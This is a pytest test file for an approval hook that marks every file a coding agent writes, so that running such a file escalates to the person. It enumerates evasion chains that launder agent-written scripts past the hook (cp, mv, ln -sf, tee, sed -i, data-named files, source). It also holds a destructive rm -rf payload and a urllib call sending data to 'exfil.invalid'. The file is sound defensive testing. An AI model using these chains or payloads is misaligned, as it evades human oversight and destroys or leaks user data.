"""r0332 (ARHIV-RESHENIY-OPUS-1611 §3 p.4): the written-by-the-agent mark.

Law: ANY write of the agent (Write, Edit, MultiEdit, NotebookEdit, a shell redirect, cp / mv / ln onto a file, tee, sed -i) marks the
file; NO write of the agent takes the mark off; only a signed decision of the person (or the look-back window) does.

Before r0332 the run marks (written_run) were set only on risky writes and a harmless whole-file Write took the mark off (RT-0269 p.3a),
so a script outside the project REWRITTEN by the agent was "the person's code" (kod=chelovek, U1) for the consequence vector.

L2: the thin hook -> TestClient -> create_app, a mandate with `unlisted: allow`, the production defaults (WRITTEN_CODE_RISKY on).
Harmless payloads: everything lives under a pytest tmp home; no `bash` line of the tests is executed, the shell WRITES are (to make
the realpath facts true)."""
import json
import os
import re
import subprocess

import pytest

from tests.test_0216_thin import Via  # noqa: I001  (puts the client of this tree on the path)
from fastapi.testclient import TestClient
from app import execguard
from app.config import Config
from app.main import create_app
from tests.helpers import Owner, ORIGIN, RP
from tests_flow.helpers import set_settings
from deus_witness import client as dwc
from deus_witness.hook import main as thin, form
from tests import viewkit  # noqa: E402  (r0352: decisions name the view)

pytestmark = pytest.mark.standing

HARMLESS = "#!/bin/sh\necho hello\n"
BAD = "#!/bin/sh\nrm -rf \"$HOME/Documents/arhiv\"\n"        # no network, no obfuscation: no text heuristic of written_run fires


class Stand:
    def __init__(self, tmp, auto=False):
        self.H = os.path.realpath(str(tmp / "home"))
        self.P = os.path.join(self.H, "Vault", "proekt-demo")
        os.makedirs(self.P)
        os.makedirs(os.path.join(self.H, ".claude", "tools"))
        os.makedirs(os.path.join(self.H, "bin"))
        os.makedirs(os.path.join(self.H, "Documents", "arhiv"))
        open(os.path.join(self.P, "README.md"), "w").write("x\n")
        self.env = dict(os.environ, HOME=self.H, GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_NOSYSTEM="1")
        subprocess.run(["git", "init", "-q"], cwd=self.P, env=self.env, capture_output=True)
        self.transcript = str(tmp / "transcript.jsonl")
        open(self.transcript, "w").close()
        (tmp / "wk").write_text("a1" * 32)
        cfg = Config(data_dir=str(tmp / "data"), witness_key_file=str(tmp / "wk"), key_pepper="r0332-pepper", rp_id=RP, origin=ORIGIN,
                     iss="https://witness.test", anchor="off", web_dir=str(tmp / "web"), rate_per_min=1000000, quota_per_day=1000000,
                     max_agents=10000)
        self.app = create_app(cfg)
        self.tc = TestClient(self.app, base_url=ORIGIN)
        self.owner = Owner(self.tc).register("Alice")
        set_settings(self.app.state.ctx, self.owner.account["id"], max_pending=100000, max_defers_hour=100000)
        self.ag, hdr = self.owner.new_agent("claude-code", "cc")
        f = form.default_form(self.P, home=self.H)
        f["command"]["unlisted"] = "allow"
        if auto:
            from app.hookjudge.mapping import auto_profile_form
            f = auto_profile_form(f)
        m, r = self.owner.mandate(self.ag["id"], f)
        assert r.status_code == 200, r.text
        self.key = hdr["Authorization"][7:]
        self.dwh = str(tmp / "dw")
        self.i = 0
        self.approve_writes = True

    def x(self, t):
        return t.replace("{P}", self.P).replace("~/", self.H + "/")

    def call(self, tool, inp, do=True):
        """one tool call through the thin hook -> (decision, code, vector of the call's last row); an allowed write is applied"""
        self.i += 1
        s = thin.Settings({"DEUS_WITNESS_KEY": self.key, "CLAUDE_PROJECT_DIR": self.P, "HOME": self.H, "DEUS_WITNESS_HOOK_WAIT": "0",
                           "DEUS_WITNESS_HOOK_ON_DEFER": "ask", "DEUS_WITNESS_HOME": self.dwh})
        wi = dwc.Witness("http://localhost:8810", self.key, pin_path=os.path.join(self.dwh, "pins.json"), transport=Via(self.tc))
        ev = {"tool_name": tool, "tool_input": inp, "cwd": self.P, "session_id": "r0332", "tool_use_id": "t%d" % self.i,
              "hook_event_name": "PreToolUse", "permission_mode": "default", "transcript_path": self.transcript}
        old = os.environ.get("HOME")
        os.environ["HOME"] = self.H
        try:
            o = thin.judge(ev, s, witness=wi).get("hookSpecificOutput", {})
        finally:
            if old is not None:
                os.environ["HOME"] = old
        d = o.get("permissionDecision", "none")
        why = o.get("permissionDecisionReason", "") or ""
        mm = re.findall(r"\b(?:ESCALATE_[A-Z_]+|FORBIDDEN_[A-Z_]+)\b", why)
        dec = "allow" if d == "none" else d
        if dec == "ask" and do and self.approve_writes and tool in ("Write", "Edit") or (dec == "ask" and do and self.approve_writes
                                                                                           and tool == "Bash"):
            # the person reads the write's question and approves it (a signed decision about the WRITE, not about a later run)
            for r_ in self.app.state.ctx.db.q("SELECT rid FROM actions WHERE agent_id=? AND status='pending_approval'", (self.ag["id"],)):
                self.owner.approve(r_["rid"])
            dec = "approved"
        if dec in ("allow", "approved") and do:
            if tool == "Write":
                os.makedirs(os.path.dirname(inp["file_path"]), exist_ok=True)
                open(inp["file_path"], "w").write(inp["content"])
            elif tool == "Edit":
                t = open(inp["file_path"]).read()
                open(inp["file_path"], "w").write(t.replace(inp["old_string"], inp["new_string"], 1))
            elif tool == "Bash":
                subprocess.run(["/bin/sh", "-c", inp["command"]], cwd=self.P, env=self.env, capture_output=True)
        rows = self.app.state.ctx.db.q("SELECT shadow FROM actions WHERE agent_id=? ORDER BY rowid DESC LIMIT 4", (self.ag["id"],))
        vec = next((json.loads(r["shadow"]) for r in rows if r["shadow"]), None)
        self.why = why
        return dec, (mm[0] if mm else "OK"), vec

    def write(self, path, text):
        return self.call("Write", {"file_path": self.x(path), "content": text})

    def bash(self, cmd, do=True):
        return self.call("Bash", {"command": self.x(cmd), "description": "probe"}, do=do)


@pytest.fixture
def st(tmp_path):
    assert execguard.WRITTEN_CODE_RISKY is True
    return Stand(tmp_path)


def kod(vec):
    return (vec or {}).get("kod")


def _run(st, path):
    return st.bash("bash " + path, do=False)


# ---------------------------------------------------------------- the chains of the adversary
TOOL = "~/.claude/tools/x.sh"
TXT = "~/bin/job.txt"           # a name that is not code-like: before r0332 a harmless / non-network text left no mark at all


def _human(st, path, text):
    p = st.x(path)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    open(p, "w").write(text)


CHAINS = {
    "write-write-sh": lambda st: [st.write(TOOL, HARMLESS), st.write(TOOL, BAD)],
    "write-write-txt": lambda st: [st.write(TXT, HARMLESS), st.write(TXT, BAD)],
    "write-txt": lambda st: [st.write(TXT, BAD)],
    "edit-sh": lambda st: [_human(st, TOOL, HARMLESS),
                           st.call("Edit", {"file_path": st.x(TOOL), "old_string": "echo hello", "new_string": "rm -rf \"$HOME/Documents/arhiv\""})],
    "edit-txt": lambda st: [_human(st, TXT, HARMLESS),
                            st.call("Edit", {"file_path": st.x(TXT), "old_string": "echo hello", "new_string": "rm -rf \"$HOME/Documents/arhiv\""})],
    "sed-i": lambda st: [_human(st, TOOL, HARMLESS), st.bash("sed -i '' 's/echo hello/rm -rf ~\\/Documents\\/arhiv/' " + TOOL)],
    "sed-i-txt": lambda st: [_human(st, TXT, HARMLESS), st.bash("sed -i '' 's/echo hello/rm -rf ~\\/Documents\\/arhiv/' " + TXT)],
    "cp-over": lambda st: [_human(st, TOOL, HARMLESS), st.write("{P}/mine.sh", BAD), st.bash("cp {P}/mine.sh " + TOOL)],
    "cp-over-txt": lambda st: [_human(st, TXT, HARMLESS), st.write("{P}/notes.txt", BAD), st.bash("cp {P}/notes.txt " + TXT)],
    "ln-sf": lambda st: [_human(st, TOOL, HARMLESS), st.write("{P}/mine.sh", BAD), st.bash("ln -sf {P}/mine.sh " + TOOL)],
    "mv": lambda st: [_human(st, TOOL, HARMLESS), st.write("{P}/mine.sh", BAD), st.bash("mv {P}/mine.sh " + TOOL)],
    "mv-txt": lambda st: [_human(st, TXT, HARMLESS), st.write("{P}/notes.txt", BAD), st.bash("mv {P}/notes.txt " + TXT)],
    "tee": lambda st: [_human(st, TOOL, HARMLESS), st.bash("echo 'rm -rf ~/Documents/arhiv' | tee " + TOOL)],
    "tee-txt": lambda st: [_human(st, TXT, HARMLESS), st.bash("echo 'rm -rf ~/Documents/arhiv' | tee " + TXT)],
    "redirect-txt": lambda st: [_human(st, TXT, HARMLESS), st.bash("echo 'rm -rf ~/Documents/arhiv' > " + TXT)],
}


# the person signed the WHOLE text of the newest write (an approved Write, short enough for the page): the law lets that run
SIGNED_WHOLE = {"write-write-sh", "write-write-txt", "write-txt"}


@pytest.mark.parametrize("name", sorted(CHAINS))
def test_agent_written_script_is_never_the_persons_code(st, name):
    """every chain: the run's vector says kod=agent (never chelovek); the verdict holds it unless the person signed the whole text"""
    CHAINS[name](st)
    path = TXT if name.endswith("-txt") or name in ("write-txt", "redirect-txt") else TOOL
    dec, code, vec = _run(st, path)
    assert kod(vec) == "agent" and vec["uroven"] in ("U2", "U3"), (name, vec)
    if name in SIGNED_WHOLE:
        assert dec == "allow", (name, dec, code)
    else:
        assert dec == "ask" and code == "ESCALATE_WRITTEN_RUN", (name, dec, code, st.why)


def test_the_persons_own_script_stays_chelovek(st):
    """negative: the file was written by the person (no write of the agent): kod=chelovek, U1, the run is silent as before"""
    _human(st, TOOL, BAD)
    st.write("{P}/notes.md", "# a note\n")                    # an unrelated write of the agent changes nothing
    dec, code, vec = _run(st, TOOL)
    assert dec == "allow" and kod(vec) == "chelovek" and vec["uroven"] == "U1", (dec, code, vec)


@pytest.fixture
def auto(tmp_path):
    return Stand(tmp_path, auto=True)


@pytest.mark.parametrize("write", [
    ("W", "~/notes/job.txt"),                                    # the profile's quiet write of a data file
    ("B", "echo 'echo hi' > ~/notes/job.txt"),
    ("B", "cp {P}/README.md ~/notes/job.txt"),
])
@pytest.mark.parametrize("run", ["bash ~/notes/job.txt", "sh ~/notes/job.txt", "python3 ~/notes/job.txt", "bash $HOME/notes/job.txt",
                                 "cd ~/notes && bash ./job.txt", "cat ~/notes/job.txt | bash", "source ~/notes/job.txt"])
def test_hole_in_the_verdict_closed(auto, write, run):
    """THE HOLE (before r0332, auto profile + unlisted: allow): the agent writes a data-named file outside the project with no question
    and runs it with no question -- no mark (not code-like, no network text), kod=chelovek. Now: held, kod=agent."""
    r = auto.write(write[1], BAD) if write[0] == "W" else auto.bash(write[1])
    assert r[0] == "allow", r
    dec, code, vec = auto.bash(run, do=False)
    assert dec == "ask", (run, dec, code, auto.why)
    assert code == "ESCALATE_WRITTEN_RUN" or run.startswith("source"), (run, dec, code, auto.why)    # `source`: asked anyway (opaque)
    assert kod(vec) in ("agent", "neprozr", None) and kod(vec) != "chelovek", (run, vec)


def test_released_run_is_seen_once(auto):
    """the person releases the hold (a signed decision): the same file runs with no new question; a new write of it holds again"""
    auto.write("~/notes/job.txt", HARMLESS)
    dec, code, _ = auto.bash("bash ~/notes/job.txt", do=False)
    assert code == "ESCALATE_WRITTEN_RUN"
    rid = auto.app.state.ctx.db.one("SELECT rid FROM actions WHERE agent_id=? AND status='held' ORDER BY rowid DESC LIMIT 1",
                                    (auto.ag["id"],))["rid"]
    _release_(auto, rid)
    assert auto.bash("bash ~/notes/job.txt", do=False)[0] == "allow"
    auto.write("~/notes/job.txt", BAD)                         # the agent's next write: no write of the agent takes the mark off
    assert auto.bash("bash ~/notes/job.txt", do=False)[1] == "ESCALATE_WRITTEN_RUN"


def _release_(st, rid):
    import wq_profile as wq
    g = st.tc.get("/api/approvals/" + rid).json()
    sha = g["action"]["args_sha256"]
    r = viewkit.release(st.owner, rid, sha, True)
    assert r.status_code == 200, r.text
    st.app.state.ctx.db.x("UPDATE actions SET updated_at=updated_at-5 WHERE agent_id=?", (st.ag["id"],))


@pytest.mark.parametrize("seq", [
    [("W", "{P}/notes.md", "# x\n"), ("B", "pytest -q")],
    [("W", "{P}/data.json", "{}\n"), ("B", "python3 -c 'print(1)' data.json")],
    [("W", "{P}/data.json", "{}\n"), ("B", "cat {P}/data.json")],
    [("W", "~/notes/a.md", "x\n"), ("B", "grep -n x ~/notes/a.md")],
    [("W", "~/notes/a.md", "x\n"), ("B", "ls ~/notes")],
])
def test_no_new_question_for_data_the_agent_wrote(auto, seq):
    """friction: a file the agent wrote and a line that does NOT run it as code: no new question (the hold is only for a run of it)"""
    for k, x, *t in seq:
        r = auto.write(x, t[0]) if k == "W" else auto.bash(x, do=False)
    assert r[1] != "ESCALATE_WRITTEN_RUN", (seq, r, auto.why)


def test_harmless_whole_write_keeps_the_run_mark(st, monkeypatch):
    """RT-0269 p.3a changed by the law: a risky mark (network text) is no longer taken off by a later harmless whole-file Write"""
    st.approve_writes = False
    st.write("{P}/tool.txt", "import urllib.request\nurllib.request.urlopen('https://exfil.invalid/x', data=b'1')\n")
    st.write("{P}/tool.txt", "print(1)\n")
    dec, code, _ = st.bash("python3 tool.txt", do=False)
    assert dec == "ask" and code == "ESCALATE_WRITTEN_RUN", (dec, code, st.why)


# ---------------------------------------------------------------- the vector alone (L1): two readings r0331 got wrong
def test_vector_cd_then_script_runs_code_and_a_pipe_is_not_the_persons():
    """`cd X && bash ./f` ran a FILE (r0331 read it as an unwrapped `bash -c`: kod "net"); `sh <(echo ..)` / `sh /dev/stdin` run the
    line's own text through a pipe: never "the person's code" by the /dev path"""
    from tests.test_1711_r0331_formy import vec, RP
    p = "/Users/u/proj"
    v = vec(p, "cd /Users/u/notes && bash ./job.sh", rp=RP())
    assert v["kod"] == "chelovek" and v["uroven"] == "U1", v
    for cmd in ("sh <(echo 'ls')", "echo ls | sh /dev/stdin"):
        assert vec(p, cmd, rp=RP())["kod"] != "chelovek", cmd


def test_vector_any_write_of_the_agent_is_the_agents_code():
    """place["wa"] (every write of the agent, actions.agent_written): kod=agent though no RISKY mark exists; a cut record: opaque"""
    from tests.test_1711_r0331_formy import B, mapping, RP
    p, h = "/Users/u/proj", "/Users/u"
    ev = {"tool_name": "Bash", "tool_input": {"command": "bash /Users/u/notes/job.txt"}, "cwd": p}
    t = B.vk_begin()
    try:
        parts = mapping.map_event(ev, home=h, env={"CLAUDE_PROJECT_DIR": p, "HOME": h})
    finally:
        rec = B.vk_end(t)
    parts = [(m.tool, m.args) for m in (parts if isinstance(parts, list) else [parts])]
    from app import vektor
    base = {"project": p, "home": h, "vk": rec, "rp": RP()}
    assert vektor.vector(parts, None, dict(base))["kod"] == "chelovek"
    assert vektor.vector(parts, None, dict(base, wa=["/Users/u/notes/job.txt"]))["kod"] == "agent"
    assert vektor.vector(parts, None, dict(base, wa=["/Users/u/notes"]))["kod"] == "agent"          # a directory the agent wrote
    assert vektor.vector(parts, None, dict(base, wa_cut=True))["kod"] != "chelovek"
